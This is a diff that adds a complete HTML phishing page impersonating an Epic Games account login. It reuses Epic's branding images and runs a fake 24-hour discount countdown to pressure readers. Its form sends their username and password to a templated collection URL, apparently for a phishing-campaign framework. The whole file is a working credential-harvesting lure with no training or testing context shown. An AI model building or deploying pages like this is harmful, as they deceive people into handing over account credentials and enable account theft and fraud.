@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Epic Games</title>
+  <style>
+    body {
+      margin: 0; padding: 0;
+      font-family: 'Inter', Arial, sans-serif;
+      background-color: #f4f4f4;
+    }
+    .container {
+      max-width: 700px;
+      margin: auto;
+      background: #000000;
+      color: #ffffff;
+    }
+    .header img {
+      width: 100%;
+      max-width: 700px;
+      display: block;
+    }
+    .title {
+      font-weight: 900;
+      font-size: 28px;
+      padding: 24px;
+      text-align: left;
+    }
+    .content {
+      padding: 0 24px 12px;
+      font-size: 16px;
+      line-height: 24px;
+      text-align: center;
+    }
+    .timer {
+      font-size: 20px;
+      font-weight: bold;
+      color: #e60012;
+      margin-top: 15px;
+    }
+    .form-box {
+      background: #f2f2f2;
+      border-radius: 12px;
+      padding: 24px;
+      max-width: 400px;
+      margin: 20px auto;
+    }
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 16px;
+      border: 1px solid #333;
+      border-radius: 8px;
+      font-size: 16px;
+      box-sizing: border-box;
+      color: #000;
+    }
+    .form-btn {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      background: #000000;
+      color: #ffffff;
+      border: none;
+      cursor: pointer;
+    }
+    .footer {
+      text-align: center;
+      font-size: 14px;
+      color: #bbb;
+      padding: 32px 24px;
+      border-top: 1px solid #333;
+    }
+    .footer img {
+      width: 60px;
+      margin-top: 20px;
+    }
+    @media screen and (max-width: 480px) {
+      .title { font-size: 22px; text-align: center; }
+      .content { font-size: 14px; }
+      .form-box { padding: 16px; }
+    }
+  </style>
+</head>
+<body>
+  <table class="container" cellpadding="0" cellspacing="0" role="presentation" width="100%">
+    <tr>
+      <td class="header">
+        <img src="https://images.acct.epicgames.com/images/2a8b51ad8aa80bebad0be4eed0f419f0/lightmode-opt/epic-games-header-dark-desktop.jpg" alt="Epic Games"/>
+      </td>
+    </tr>
+    <tr>
+      <td class="title">
+        Account Login
+      </td>
+    </tr>
+    <tr>
+      <td class="content">
+        Hi {{if .FirstName}}{{.FirstName}}{{else}}there{{end}},<br/>
+        This exclusive discount will expire in just 24 hours!
+        <div id="countdown" class="timer">Offer ends in: 24:00:00</div>
+        <p style="font-size:18px; font-weight:600; margin-top:20px;">
+          Sign in with an Epic Games Account
+        </p>
+      </td>
+    </tr>
+    <tr>
+      <td>
+        <form method="POST" action="{{.PostURL}}" class="form-box">
+          <input type="text" name="username" placeholder="Username" class="form-input" required />
+          <input type="password" name="password" placeholder="Password" class="form-input" required />
+          <button type="submit" class="form-btn">LOG IN NOW</button>
+        </form>
+      </td>
+    </tr>
+    <tr>
+      <td class="footer">
+        Don't have an Epic Games Account?<br/>
+        <a href="{{.URL}}" style="color:#26BBFF; text-decoration:underline;">Sign up</a> or
+        <a href="{{.URL}}" style="color:#26BBFF; text-decoration:underline;">Sign in Later</a>
+        <br/><br/>
+        Thank you,<br/>
+        The Epic Games Team
+        <br/>
+        <img src="https://images.acct.epicgames.com/images/2a8b51ad8aa80bebad0be4eed0f419f0/lightmode-opt/footer-epic-logo-dark.png" alt="Epic Games Logo"/>
+      </td>
+    </tr>
+  </table>
+
+  <script>
+    // 设置 24 小时倒计时
+    var countdownDate = new Date().getTime() + (24 * 60 * 60 * 1000);
+
+    var x = setInterval(function() {
+      var now = new Date().getTime();
+      var distance = countdownDate - now;
+
+      var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+      document.getElementById("countdown").innerHTML =
+        "Offer ends in: " + hours + "h " + minutes + "m " + seconds + "s";
+
+      if (distance < 0) {
+        clearInterval(x);
+        document.getElementById("countdown").innerHTML = "Offer expired";
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
